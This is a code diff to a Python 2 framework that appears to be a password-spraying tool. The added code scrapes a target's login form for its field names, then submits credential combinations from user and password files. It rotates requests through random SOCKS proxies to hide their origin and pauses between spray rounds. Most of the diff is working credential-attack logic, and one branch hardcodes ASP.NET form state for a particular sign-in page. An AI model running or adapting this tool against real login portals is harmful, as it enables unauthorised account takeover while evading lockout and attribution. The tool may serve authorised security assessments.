@@ -13,6 +13,11 @@ from requests import session
 import re
 from threading import RLock, Thread
 import importlib
+from lxml import html
+import random
+import time
+from collections import OrderedDict
+
 
 class Framework():
     def __init__(self):
@@ -34,21 +39,26 @@ class Framework():
 
     def connectTest(self, modules_dict, finger_dict):
             with session() as c:
+                proxy = self.proxySelect()
                 requests.packages.urllib3.disable_warnings()
                 if self.config["vhost"]:
-                    initialConnect = c.get(self.config["HOST"] + "/" + self.config["vhost"], verify=False)
+                    initialConnect = c.get(self.config["HOST"] + "/" + self.config["vhost"], verify=False, proxies=proxy)
                 else:
-                    initialConnect = c.get(self.config["HOST"], verify=False, allow_redirects=True)
+                    initialConnect = c.get(self.config["HOST"], verify=False, allow_redirects=True, proxies=proxy)
+                #print initialConnect.text
+                #print finger_dict
                 for k in finger_dict:
                     search = re.search(str(k), initialConnect.text)
                     if search:
                         print "[+] Running " + self.search(finger_dict, str(k)) + " module..."
-                        mod_run = self.search(finger_dict, str(k))
+                        USERNAMEFLD, PASSWORDFLD, submitLoc, submitType = self.scraper()
+                        if self.config["test"] == True:
+                            mod_run = "testmod"
+                        else:
+                            mod_run = self.search(finger_dict, str(k))
                         mod_import = "modules." + mod_run
-                        for test in self.coolness.keys():
-                            if mod_run in test:
-                                _instance = self.coolness[test]
-                                _instance.payload(self.config)
+                        self.payloadBldr(self.config, USERNAMEFLD, PASSWORDFLD, mod_run, mod_import, submitLoc, submitType)
+
 
     def loadFingerprint(self, type, dirpath, filename):
         finger_dict = {}
@@ -64,8 +74,7 @@ class Framework():
             _module = __import__(mod_loadname)
             _class = getattr(_module, mod_name)
             _instance = _class(self.config, self.display, self.modulelock)
-            finger_dict = {mod_name: 'name',
-                            'fingerprint': _instance.getFingerprint()}
+            finger_dict = {'fingerprint': _instance.getFingerprint(), mod_name: 'name'}
 
 
         except Exception as e:
@@ -116,10 +125,130 @@ class Framework():
                     if module is not None:
                         module_dict[module['name'].rstrip(" ")] = module
                     fingerprint = self.loadFingerprint("modules", dirpath, filename)
+                    #print fingerprint
                     if module is not None:
                         finger_dict[fingerprint['fingerprint'].rstrip(" ")] = fingerprint
 
         return module_dict, finger_dict
+
+    def payloadBldr(self, config, USERNAMEFLD, PASSWORDFLD, mod_run, mod_import, submitLoc, submitType):
+        if self.config["PASS_FILE"]:
+            pass_lines = [pass_line.rstrip('\n') for pass_line in open(self.config["PASS_FILE"])]
+            for pass_line in pass_lines:
+                if self.config["UserFile"]:
+                    lines = [line.rstrip('\n') for line in open(self.config["UserFile"])]
+                    for line in lines:
+                        self.config["USERNAME"] = line.strip('\n')
+                        self.config["PASSWORD"] = pass_line.strip('\n')
+                        payload = {
+                            USERNAMEFLD: self.config["USERNAME"],
+                            PASSWORDFLD: self.config["PASSWORD"]
+                        }
+                        proxy = self.proxySelect()
+                        for test in self.coolness.keys():
+                            if mod_run in test:
+                                _instance = self.coolness[test]
+                                _instance.connectTest(self.config, payload, proxy, submitLoc, submitType)
+                    time.sleep(self.config["timeout"])
+                else:
+                    self.config["PASSWORD"] = pass_line.strip('\n')
+                    payload = {
+                        USERNAMEFLD: self.config["USERNAME"],
+                        PASSWORDFLD: self.config["PASSWORD"]
+                    }
+                    proxy = self.proxySelect()
+                    for test in self.coolness.keys():
+                        if mod_run in test:
+                            _instance = self.coolness[test]
+                            _instance.connectTest(self.config, payload, proxy, submitLoc, submitType)
+                    time.sleep(self.config["timeout"])
+        elif self.config["UserFile"]:
+            lines = [line.rstrip('\n') for line in open(self.config["UserFile"])]
+            for line in lines:
+                self.config["USERNAME"] = line.strip('\n')
+                payload = {
+                    USERNAMEFLD: self.config["USERNAME"],
+                    PASSWORDFLD: self.config["PASSWORD"]
+                }
+                proxy = self.proxySelect()
+                for test in self.coolness.keys():
+                    if mod_run in test:
+                        _instance = self.coolness[test]
+                        _instance.connectTest(self.config, payload, proxy, submitLoc, submitType)
+        else:
+            payload = {
+                USERNAMEFLD: self.config["USERNAME"],
+                PASSWORDFLD: self.config["PASSWORD"],
+                "__VIEWSTATE": "/wEPDwUJMzAzMTU0MDM5ZGT5KyPzqKwv1g7HOWCiAUBQiw5zrw==",
+                "__VIEWSTATEGENERATOR": "A8DCC610",
+                "__EVENTVALIDATION": "/wEWAgLv8p6DCgLnmcnFAYge3Aj6rAKuxSeOde780UTV9cY1",
+                "__db": "14",
+                "ctl00$ContentPlaceHolder1$SubmitButton": "Sign+In"
+            }
+            proxy = self.proxySelect()
+            for test in self.coolness.keys():
+                if mod_run in test:
+                    _instance = self.coolness[test]
+                    _instance.connectTest(self.config, payload, proxy, submitLoc, submitType)
+
+    def scraper(self):
+            with session() as c:
+                requests.packages.urllib3.disable_warnings()
+                proxy = self.proxySelect()
+                if self.config["vhost"]:
+                    resp1 = c.get(self.config["HOST"] + "/" + self.config["vhost"], verify=False, proxies=proxy)
+                else:
+                    resp1 = c.get(self.config["HOST"], verify=False, allow_redirects=True, proxies=proxy)
+                tree = html.fromstring(resp1.content)
+                #print resp1.text
+                submitLoc=""
+                submitType="post"
+                try:
+                    submitLoc=re.findall('<form (.*?)>', str(resp1.text), re.DOTALL)
+#                    submitType=re.findall('method="(.*?)"', str(submitLoc), re.DOTALL)
+#                    print submitLoc
+                    submitLoc=re.findall('action="(.*?)"', str(submitLoc), re.DOTALL)
+                    #print submitLoc
+                    submitLoc=str(submitLoc).split("'")[1]
+#                    submitType=str(submitType).split("'")[1].lower()
+                except Exception as e:
+#                    # notify the user of errors
+                    print e
+#                    return None
+                #print submitLoc
+#                print submitType
+                selection=tree.xpath('//input[@name]')
+                selection1=re.findall("name='(.*?)'", str(selection), re.DOTALL)
+                USERNAMEFLD = ""
+                PASSWORDFLD = ""
+                #print resp1.text
+                for selection in selection1:
+                    if (not USERNAMEFLD):
+                        if 'user' in selection:
+                            USERNAMEFLD = selection
+                        elif 'User' in selection:
+                            USERNAMEFLD = selection
+                        elif 'log' in selection:
+                            USERNAMEFLD = selection
+                    if (not PASSWORDFLD):
+                        if 'pwd' in selection:
+                            PASSWORDFLD = selection
+                        elif 'pass' in selection and 'hidden' not in selection:
+                            PASSWORDFLD = selection
+                        elif 'Pass' in selection:
+                            PASSWORDFLD = selection
+                return USERNAMEFLD, PASSWORDFLD, submitLoc, submitType
+
+    def proxySelect(self):
+        if self.config["proxies"] is not 0:
+            proxy = random.choice(self.config["proxies"])
+            if proxy:
+                proxy = {   'http': 'socks5://' + proxy,
+                        'https': 'socks5://' + proxy
+            }
+        else:
+            proxy = ""
+        return proxy
 
     def parseParameters(self, argv):
         parser = argparse.ArgumentParser()
@@ -162,14 +291,18 @@ class Framework():
             dest="vhost",
             action="store",
             help="Virtual Directory (i.e., for rapid7.com/owa enter owa). This is used for fingerprinting purposes only.")
-#        filesgroup.add_argument("--proxies",
-#            dest="proxies",
-#            action="store",
-#            help="Comma-separated list of SOCKS proxies. (i.e. 127.0.0.1:9050,127.0.0.1:18085)")
+        filesgroup.add_argument("--proxies",
+            dest="proxies",
+            action="store",
+            help="Comma-separated list of SOCKS proxies. (i.e. 127.0.0.1:9050,127.0.0.1:18085)")
         filesgroup.add_argument("--timeout",
             dest="timeout",
             action="store",
             help="Number of minutes to wait between password sprays (Brute Force Mode Only)")
+        filesgroup.add_argument("--test",
+            dest="test",
+            action="store_true",
+            help="Run against test module. Userful for building modules.")
         args = parser.parse_args()
         self.config["USERNAME"] = args.USERNAME
         self.config["PASSWORD"] = args.PASSWORD
@@ -180,14 +313,17 @@ class Framework():
         self.config["PASS_FILE"] = args.PASS_FILE
         self.config["dry_run"] = args.dry_run
         self.config["vhost"] = args.vhost
-        #self.config["proxies"] = str(args.proxies).split(',')
+        self.config["proxies"] = str(args.proxies).split(',')
         self.config["timeout"] = args.timeout
-        print self.config["timeout"]
+        self.config["test"] = args.test
+        if 'None' in self.config["proxies"]:
+            self.config["proxies"] = 0
         if self.config["timeout"] is None:
             self.config["timeout"] = 0
         else:
             self.config["timeout"] = float(self.config["timeout"])*60
         parser.set_defaults(dry_run=False)
+        parser.set_defaults(test=False)
         if ((self.config["UserFile"] == "") and (self.config["USERNAME"] == "") and (self.config["PASSWORD"] == "")):
             print "Either -u and -p both must be set or -U must be set"
             parser.print_help()
